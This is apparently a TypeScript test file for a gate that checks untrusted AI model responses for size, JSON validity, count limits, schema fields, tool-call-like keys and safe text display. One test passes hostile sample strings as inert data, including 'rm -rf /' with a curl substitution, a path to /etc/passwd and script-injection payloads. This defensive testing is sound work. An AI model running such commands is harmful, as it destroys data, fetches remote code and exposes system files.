// Task 3.8: the untrusted AI response gate, mechanics only (a stand-in validator; the real schemas are used in packages/discovery-loop/test/responseGate.integration.test.ts).
// The whole-response property test is task 3.9. Synthetic data only.
import { describe, expect, it } from "vitest";
import {
  DEFAULT_RESPONSE_LIMITS, RESPONSE_MAX_DEPTH, gateProviderResult, gateResponse, looksLikeToolCall, resolveResponseLimits, sha256Hex, toInertText,
} from "../src/index.js";
import type { GateRejection, Json, ProviderError, ResponseLimits, Result, SchemaIssue, SchemaValidatorPort } from "../src/index.js";

const MARK = "MARKER-RESPONSE-TEXT-7731";
const enc = (s: string): Uint8Array => new TextEncoder().encode(s);
const isObj = (v: unknown): v is { [k: string]: Json } => typeof v === "object" && v !== null && !Array.isArray(v);

/** A stand-in for the schema validator: closed objects with a few required keys, in the issue format of discovery-loop. */
function fakeValidator(): SchemaValidatorPort & { calls: string[] } {
  const calls: string[] = [];
  const shapes: Record<string, { required: string[]; allowed: string[] }> = {
    "hypothesis-proposal": { required: ["claims"], allowed: ["claims", "derived", "tables"] },
    experiment: { required: ["localKey", "requests"], allowed: ["localKey", "requests", "target", "prediction", "stateChecks", "preparation"] },
  };
  return {
    calls,
    validate(name: string, value: unknown): Result<Json, readonly SchemaIssue[]> {
      calls.push(name);
      const s = shapes[name];
      if (s === undefined || !isObj(value)) return { ok: false, error: [{ code: "bad_type", path: "" }] };
      const issues: SchemaIssue[] = [];
      for (const k of Object.keys(value)) if (!s.allowed.includes(k)) issues.push({ code: "undefined_field", path: `/${k}` });
      for (const k of s.required) if (!(k in value)) issues.push({ code: "missing_field", path: `/${k}` });
      return issues.length > 0 ? { ok: false, error: issues } : { ok: true, value: value as Json };
    },
  };
}
const L = DEFAULT_RESPONSE_LIMITS;
const limits = (o: Partial<ResponseLimits> = {}): ResponseLimits => ({ ...L, ...o });
const hyp = (o: unknown = { claims: [{ localKey: "a", citations: [1] }] }): Uint8Array => enc(JSON.stringify(o));
const rej = (r: ReturnType<typeof gateResponse>): GateRejection => {
  if (r.ok) throw new Error("expected a rejection");
  return r;
};

describe("limits (R17.2)", () => {
  it("has the defaults of R17.2 and a fixed depth of 32", () => {
    expect(L).toEqual({ maxResponseBytes: 262144, maxClaims: 50, maxCitationsPerClaim: 5, maxExperiments: 10, maxRequestsPerExperiment: 10, maxRequestBodyBytes: 8192 });
    expect(RESPONSE_MAX_DEPTH).toBe(32);
  });
  it("applies integer values of at least 1 and refuses anything else by name, with no default in its place", () => {
    expect(resolveResponseLimits({ maxClaims: 3 })).toEqual({ ok: true, value: { ...L, maxClaims: 3 } });
    expect(resolveResponseLimits({})).toEqual({ ok: true, value: L });
    for (const bad of [0, -1, 1.5, Number.NaN, Infinity, "5", null, undefined, 2 ** 60, true]) {
      expect(resolveResponseLimits({ maxExperiments: bad }), String(bad)).toEqual({ ok: false, error: { code: "limit_invalid", name: "maxExperiments" } });
    }
    expect(resolveResponseLimits({ maxDepth: 40 })).toEqual({ ok: false, error: { code: "limit_unknown", name: "maxDepth" } });
    expect(Object.isFrozen((resolveResponseLimits({}) as { value: unknown }).value)).toBe(true);
  });
});

describe("before parsing, and strict parsing", () => {
  it("rejects an oversized response before any parsing, whatever it contains", () => {
    const v = fakeValidator();
    const big = enc("x".repeat(L.maxResponseBytes + 1)); // not JSON either: the size reason wins, nothing was parsed
    const r = rej(gateResponse("hypothesis_generation", big, L, v));
    expect(r.reason).toBe("size_exceeded");
    expect(r.limit).toEqual({ name: "maxResponseBytes", limit: L.maxResponseBytes, observed: L.maxResponseBytes + 1 });
    expect(r.failedCall).toBe(true);
    expect(v.calls).toEqual([]);
    expect(rej(gateResponse("hypothesis_generation", enc("x".repeat(L.maxResponseBytes)), L, v)).reason).toBe("invalid_json"); // exactly the limit is not too large
  });

  it("rejects invalid UTF-8, a BOM, invalid JSON, trailing text, a duplicate key, an unsafe number and nesting beyond 32 levels", () => {
    const v = fakeValidator();
    const cases: [string, Uint8Array][] = [
      ["invalid_utf8", new Uint8Array([0x7b, 0xff, 0x7d])],
      ["invalid_json", new Uint8Array([0xef, 0xbb, 0xbf, 0x7b, 0x7d])],
      ["invalid_json", enc("{claims: []}")],
      ["invalid_json", enc("{} {}")],
      ["invalid_json", enc("")],
      ["invalid_json", enc("```json\n{}\n```")],
      ["duplicate_key", enc('{"claims":[],"claims":[]}')],
      ["unsafe_number", enc('{"claims":[9007199254740993]}')],
      ["depth_exceeded", enc("[".repeat(33) + "]".repeat(33))],
    ];
    for (const [reason, bytes] of cases) {
      const r = rej(gateResponse("hypothesis_generation", bytes, L, v));
      expect(r.reason, reason).toBe(reason);
      expect(r.failedCall).toBe(true);
    }
    expect(v.calls).toEqual([]); // the validator never saw a response that did not parse
    expect(gateResponse("hypothesis_generation", enc(`{"claims":${"[".repeat(28)}${"]".repeat(28)}}`), L, v).ok).toBe(true); // 29 levels
  });

  it("rejects a value that cannot be written as canonical JSON (a lone surrogate, a number outside the safe range)", () => {
    const v = fakeValidator();
    expect(rej(gateResponse("hypothesis_generation", enc('{"claims":["\\ud800"]}'), L, v)).reason).toBe("not_canonicalizable");
    expect(rej(gateResponse("hypothesis_generation", enc('{"claims":[1e300]}'), L, v)).reason).toBe("not_canonicalizable");
    expect(v.calls).toEqual([]);
  });
});

describe("count limits reject the whole response and say which limit (R17.4)", () => {
  it("claims, citations per claim, experiments, requests per experiment, and the bytes of a request body", () => {
    const v = fakeValidator();
    const claims = (n: number, citations = 1) => ({ claims: Array.from({ length: n }, () => ({ citations: Array.from({ length: citations }, () => 1) })) });
    const a = rej(gateResponse("hypothesis_generation", hyp(claims(51)), L, v));
    expect([a.reason, a.limit]).toEqual(["count_exceeded", { name: "maxClaims", limit: 50, observed: 51 }]);
    expect(gateResponse("hypothesis_generation", hyp(claims(50)), L, v).ok).toBe(true);
    const b = rej(gateResponse("hypothesis_revision", hyp(claims(2, 6)), L, v));
    expect(b.limit).toEqual({ name: "maxCitationsPerClaim", limit: 5, observed: 6 });
    expect(rej(gateResponse("hypothesis_generation", hyp(claims(3)), limits({ maxClaims: 2 }), v)).limit?.limit).toBe(2);
    const exps = (n: number, requests = 1, body?: Json) => ({
      experiments: Array.from({ length: n }, () => ({ localKey: "a", requests: Array.from({ length: requests }, () => (body === undefined ? { method: "GET", path: "/x" } : { method: "POST", path: "/x", body })) })),
    });
    expect(rej(gateResponse("experiment_generation", hyp(exps(11)), L, v)).limit).toEqual({ name: "maxExperiments", limit: 10, observed: 11 });
    expect(rej(gateResponse("experiment_generation", hyp(exps(1, 11)), L, v)).limit).toEqual({ name: "maxRequestsPerExperiment", limit: 10, observed: 11 });
    const body = (n: number): Json => ({ d: "x".repeat(n - 8) }); // canonical form is {"d":"…"}: n bytes in all
    expect(gateResponse("experiment_generation", hyp(exps(1, 1, body(8192))), L, v).ok).toBe(true);
    expect(rej(gateResponse("experiment_generation", hyp(exps(1, 1, body(8193))), L, v)).limit).toEqual({ name: "maxRequestBodyBytes", limit: 8192, observed: 8193 });
    expect(rej(gateResponse("experiment_generation", hyp(exps(1, 1, body(300))), limits({ maxRequestBodyBytes: 299 }), v)).limit?.observed).toBe(300);
  });
  it("counts before the schema: an over-count response never reaches the validator", () => {
    const v = fakeValidator();
    rej(gateResponse("hypothesis_generation", hyp({ claims: Array.from({ length: 60 }, () => ({})), bogus: 1 }), L, v));
    expect(v.calls).toEqual([]);
  });
});

describe("schema stage", () => {
  it("accepts a valid hypothesis and a valid experiment envelope, with the SHA-256 and size of the exact bytes", () => {
    const v = fakeValidator();
    const bytes = hyp();
    const r = gateResponse("hypothesis_generation", bytes, L, v);
    expect(r.ok).toBe(true);
    if (r.ok && r.kind === "hypothesis_generation") expect(r.proposal).toEqual({ claims: [{ localKey: "a", citations: [1] }] });
    expect(r.sha256).toBe(sha256Hex(bytes));
    expect(r.byteLength).toBe(bytes.length);
    const e = gateResponse("experiment_generation", hyp({ experiments: [{ localKey: "a", requests: [] }] }), L, v);
    expect(e.ok && e.kind === "experiment_generation" && e.experiments.length).toBe(1);
    const none = gateResponse("experiment_generation", hyp({ experiments: [] }), L, v);
    expect(none.ok && none.kind === "experiment_generation" && none.experiments.length === 0 && none.rejectedExperiments.length === 0).toBe(true);
  });

  it("rejects a field the schema does not define, a missing field, a wrong type, and a root that is not an object", () => {
    const v = fakeValidator();
    expect(rej(gateResponse("hypothesis_generation", hyp({ claims: [], extra: 1 }), L, v)).reason).toBe("undefined_field");
    expect(rej(gateResponse("hypothesis_generation", hyp({}), L, v)).reason).toBe("schema_violation");
    for (const root of ["[]", "7", '"text"', "null", "true"]) expect(rej(gateResponse("hypothesis_generation", enc(root), L, v)).reason, root).toBe("schema_violation");
    expect(rej(gateResponse("experiment_generation", hyp({ experiments: "x" }), L, v)).reason).toBe("schema_violation");
    expect(rej(gateResponse("experiment_generation", hyp({}), L, v)).reason).toBe("schema_violation");
    expect(rej(gateResponse("experiment_generation", hyp({ experiments: [], extra: 1 }), L, v)).reason).toBe("undefined_field");
  });

  it("rejects an Experiment on its own when it fails the schema without an undefined field (R7.4), and the whole response when one has an undefined field (R17.6)", () => {
    const v = fakeValidator();
    const mixed = gateResponse("experiment_generation", hyp({ experiments: [{ localKey: "a", requests: [] }, { requests: [] }, { localKey: "c", requests: [] }] }), L, v);
    expect(mixed.ok).toBe(true);
    if (mixed.ok && mixed.kind === "experiment_generation") {
      expect(mixed.experiments).toHaveLength(2);
      expect(mixed.rejectedExperiments).toEqual([{ index: 1, issues: [{ code: "missing_field", path: "/localKey" }] }]);
    }
    const whole = rej(gateResponse("experiment_generation", hyp({ experiments: [{ localKey: "a", requests: [] }, { localKey: "b", requests: [], shell: "ls" }] }), L, v));
    expect(whole.reason).toBe("undefined_field");
    expect(whole.issues).toEqual([{ code: "undefined_field", path: "/experiments/1/shell" }]);
  });
});

describe("tool calls and actions", () => {
  it("recognises field names of a tool call, function call, action or command", () => {
    for (const n of ["tool_call", "tool_calls", "toolCall", "function_call", "functions", "action", "actions", "command", "commands", "exec", "execute", "shell", "bash", "invoke", "tool-use", "Tool_Use"]) {
      expect(looksLikeToolCall(n), n).toBe(true);
    }
    for (const n of ["claims", "notes", "localKey", "target", "description", "tools_note_is_not", "xtool"].filter((x) => x !== "tools_note_is_not")) expect(looksLikeToolCall(n), n).toBe(false);
  });

  it("rejects the whole response for such a field and flags it, whether it sits at the top, in a Claim list or in an Experiment", () => {
    const v = fakeValidator();
    for (const name of ["tool_calls", "function_call", "action", "command"]) {
      const top = rej(gateResponse("hypothesis_generation", hyp({ claims: [], [name]: [{ name: "run", arguments: MARK }] }), L, v));
      expect([top.reason, top.toolCallLike], name).toEqual(["undefined_field", true]);
      const inExp = rej(gateResponse("experiment_generation", hyp({ experiments: [{ localKey: "a", requests: [], [name]: MARK }] }), L, v));
      expect([inExp.reason, inExp.toolCallLike], name).toEqual(["undefined_field", true]);
    }
    const plain = rej(gateResponse("hypothesis_generation", hyp({ claims: [], notes: "x" }), L, v));
    expect([plain.reason, plain.toolCallLike]).toEqual(["undefined_field", false]);
  });

  it("treats text that talks about commands, paths or markup as inert data, not as an action", () => {
    const v = fakeValidator();
    const text = ["rm -rf / ; $(curl http://example.invalid)", "../../etc/passwd", "<script>alert(1)</script>", "tool_call: {\"name\":\"run\"}", "`whoami`", "{{template}} ${env.HOME}", "javascript:alert(1)"];
    const r = gateResponse("hypothesis_generation", hyp({ claims: text.map((t) => ({ description: t })) }), L, v);
    expect(r.ok).toBe(true);
    if (r.ok && r.kind === "hypothesis_generation") expect(JSON.stringify(r.proposal)).toContain("etc/passwd");
  });
});

describe("fail closed: a response that cannot be inspected is rejected", () => {
  it("a validator that throws, or answers in another shape, rejects the whole response and the gate does not throw", () => {
    const answers: unknown[] = [undefined, null, "ok", { ok: "yes" }, { ok: false }, { ok: false, error: "no" }, { ok: false, error: [{ code: 1 }] }, 42];
    for (const a of answers) {
      const v: SchemaValidatorPort = { validate: () => a as never };
      expect(rej(gateResponse("hypothesis_generation", hyp(), L, v)).reason, JSON.stringify(a)).toBe("not_inspectable");
    }
    const thrower: SchemaValidatorPort = { validate: () => { throw new Error(MARK); } };
    const r = rej(gateResponse("hypothesis_generation", hyp(), L, thrower));
    expect(r.reason).toBe("not_inspectable");
    expect(JSON.stringify(r).includes(MARK)).toBe(false);
    expect(rej(gateResponse("tool_call" as never, hyp(), L, fakeValidator())).reason).toBe("not_inspectable");
    expect(rej(gateResponse("hypothesis_generation", "text" as never, L, fakeValidator())).reason).toBe("not_inspectable");
  });
});

describe("a rejection carries no text of the response", () => {
  it("holds codes, sanitized paths, the limit, the size and the hash, for every kind of rejection", () => {
    const v = fakeValidator();
    const hostileKey = `key-${MARK}`;
    const bodies: Uint8Array[] = [
      enc(JSON.stringify({ claims: [], [hostileKey]: MARK })),
      enc(`{"claims":[],"${hostileKey}":1,"${hostileKey}":2}`),
      enc(`{"a":${MARK}}`),
      enc(JSON.stringify({ claims: Array.from({ length: 60 }, () => ({ note: MARK })) })),
      enc(JSON.stringify({ claims: [{ a: "\ud800" + MARK }] }).replace("\\ud800", "\\ud800")),
      new Uint8Array([...enc(MARK), 0xff]),
      enc(MARK.repeat(30_000)),
    ];
    for (const b of bodies) {
      const r = rej(gateResponse("hypothesis_generation", b, L, v));
      const text = JSON.stringify(r);
      expect(text.includes(MARK), "a rejection contains response text").toBe(false);
      expect(Object.keys(r).sort()).toEqual(expect.arrayContaining(["byteLength", "failedCall", "issues", "kind", "ok", "reason", "sha256", "toolCallLike"]));
      expect(r.sha256).toBe(sha256Hex(b));
      expect("proposal" in r || "experiments" in r || "value" in r).toBe(false);
      for (const i of r.issues) expect(/^\/[A-Za-z0-9_<>/.]*$|^$/.test(i.path), i.path).toBe(true);
    }
    // an unknown, hostile field name is reported as <key>, a normal one by its name
    const named = rej(gateResponse("hypothesis_generation", enc(JSON.stringify({ claims: [], [hostileKey]: 1, notes: 1 })), L, v));
    expect(named.issues.map((i) => i.path).sort()).toEqual(["/<key>", "/notes"]);
  });

  it("is not changed by what happens to the input array afterwards", () => {
    const v = fakeValidator();
    const b = hyp();
    const r = gateResponse("hypothesis_generation", b, L, v);
    b.fill(0);
    expect(r.sha256).toBe(sha256Hex(hyp()));
  });
});

describe("connection to the provider result", () => {
  const ok = (bytes: Uint8Array): Result<Uint8Array, ProviderError> => ({ ok: true, value: bytes });
  const err = (e: ProviderError): Result<Uint8Array, ProviderError> => ({ ok: false, error: e });

  it("accepts a response only through the gate", () => {
    const v = fakeValidator();
    const out = gateProviderResult("hypothesis_generation", ok(hyp()), L, v);
    expect(out.kind).toBe("accepted");
    const bad = gateProviderResult("hypothesis_generation", ok(enc("not json")), L, v);
    expect(bad).toMatchObject({ kind: "failed_call", reason: "unparseable", retryable: true, source: "gate", toolCall: false });
    expect(JSON.stringify(bad).includes("not json")).toBe(false);
    expect("result" in bad).toBe(false);
  });

  it("classifies provider errors as failed calls that may be retried with a new audit, and a tool-call event as such", () => {
    const v = fakeValidator();
    const o = (reason: ProviderError["reason"]) => gateProviderResult("hypothesis_generation", err({ reason, detail: MARK } as ProviderError), L, v);
    expect(o("timeout")).toMatchObject({ kind: "failed_call", reason: "timeout", retryable: true, source: "provider", toolCall: false });
    expect(o("error")).toMatchObject({ reason: "error", toolCall: false });
    expect(o("unmatched_request")).toMatchObject({ reason: "error", providerReason: "unmatched_request" });
    expect(o("undeterminable")).toMatchObject({ reason: "error", providerReason: "undeterminable" });
    expect(o("tool_call_detected")).toMatchObject({ reason: "error", providerReason: "tool_call_detected", toolCall: true });
    expect(JSON.stringify(o("error")).includes(MARK)).toBe(false);
    expect(v.calls).toEqual([]); // a provider error never reaches the gate
  });

  it("keeps an audit violation apart: not a failed call, never retried, the Run stops", () => {
    const v = fakeValidator();
    const violation = { code: "already_used" as const, requestKind: "hypothesis_generation" as const };
    const o = gateProviderResult("hypothesis_generation", err({ reason: "audit_violation", detail: "x", violation }), L, v);
    expect(o).toEqual({ kind: "audit_violation", retryable: false, stopRun: true, violation });
    expect("reason" in o).toBe(false);
  });

  it("never throws, whatever it is given", () => {
    const v = fakeValidator();
    for (const r of [undefined, null, {}, { ok: true }, { ok: true, value: "x" }, { ok: false }, { ok: false, error: null }] as never[]) {
      expect(() => gateProviderResult("hypothesis_generation", r, L, v)).not.toThrow();
      expect(gateProviderResult("hypothesis_generation", r, L, v).kind).not.toBe("accepted");
    }
  });
});

describe("display as inert plain text (R17.8)", () => {
  it("escapes markup characters and makes control and bidirectional characters visible", () => {
    expect(toInertText('<script>alert("x")</script> & \'q\' `c`')).toBe("&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt; &amp; &#39;q&#39; &#96;c&#96;");
    expect(toInertText("a\u0000b\u001bc\u202ed\u2028e\ufeff")).toBe("a\\u0000b\\u001bc\\u202ed\\u2028e\\ufeff");
    expect(toInertText("line1\nline2\tx")).toBe("line1\nline2\tx");
  });
  it("leaves ordinary and Japanese text as it is, accepts bytes, and cuts long text with a mark", () => {
    expect(toInertText("割引率は50%です。ＡＢＣ")).toBe("割引率は50%です。ＡＢＣ");
    expect(toInertText(enc("<b>"))).toBe("&lt;b&gt;");
    expect(toInertText("x".repeat(20), 10)).toBe(`${"x".repeat(10)}\n[cut at 10 characters]`);
  });
  it("shows an invalid byte sequence without throwing", () => {
    expect(() => toInertText(new Uint8Array([0xff, 0x3c]))).not.toThrow();
    expect(toInertText(new Uint8Array([0xff, 0x3c])).endsWith("&lt;")).toBe(true);
  });
});